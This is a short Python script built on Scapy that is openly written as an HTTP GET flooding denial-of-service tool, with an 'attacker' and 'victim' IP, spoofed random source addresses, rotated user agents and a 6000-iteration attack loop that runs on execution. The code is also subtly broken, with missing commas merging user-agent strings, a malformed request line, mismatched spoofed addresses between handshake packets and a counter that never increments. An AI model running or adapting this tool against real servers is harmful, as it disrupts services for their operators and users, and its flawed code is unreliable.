from scapy.all import *
from threading import Thread
import socket
import random

useragents = [ ##user envs
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CL R 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)"
"Opera/9.20 (Windows NT 6.0; U; en)",
"Mozilla/5.0 (X11; U; Linux 1686; en-US; rv: 1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux 1686; U; en) Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) ApplewebKit/528.16 (KHTML, li ke Gecko) Version/4.0 Safari/528.16"
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
"Mozilla/5.0 (Xl1; U; Linux X86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)"
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv: 1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (XII; U; Linux X86_64; en-US; rv: 1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8"
"Mozilla/5.0 (XII; U; Linux X86_64; en-US; rv: 1.9.2.7) Gecko/20100809 Fedora/3.6.7-1. fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-incdot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]

Attacker_ip = "192.168.0.75" #Attacker Ip adress 
target_ip = "192.168.0.34" #victim Ip adress
target_port = 80 # victim port
target_url = "192.168.0.34/temp"

class GET_flooding(Thread):
    
    def __init__(self,dst_ip,port,url):
        Thread.__init__(self)
        self.url=url
        self.dst_ip=dst_ip
        self.port=port
    
    ##make Victim information(get method)
    def make_attack_information(self):
        random_attacker_ip = RandIP()
        req_header='GET {} HTTP/1.2\r\n'.format(target_ip)
        req_header+='Host : {}\r\n'.format(random_attacker_ip) # random_ip
        req_header+='User-Agent: {}\r\n'.format(random.choice (useragents))
        req_header+='Cache-Control : max-age=20\r\n' 
        req_header+='\r\n'

        return req_header, random_attacker_ip 

    def Run_Attack(self):
        self.req_head, self.source_ip = self.make_attack_information()
        print(self.source_ip)
        self.source_port = int(RandShort())
        self.packet=IP(src=Attacker_ip, dst=self.dst_ip)/TCP(sport=self.source_port,dport=self.port,flags='S')
        
        self.syn_ack = sr1(self.packet)
        self.ack = IP(src=self.source_ip, dst=self.dst_ip)/TCP(sport=self.source_port,dport=self.port,seq=self.syn_ack[TCP].ack,ack=self.syn_ack[TCP].seq+1)/self.req_head
        send(self.ack) ##make 3hand_shake

def runs():
    count = 0
    for get in range(6000):
        get = GET_flooding(target_ip,target_port,target_url)
        get.Run_Attack()
        count =+ 1
        print(count)
    
runs()

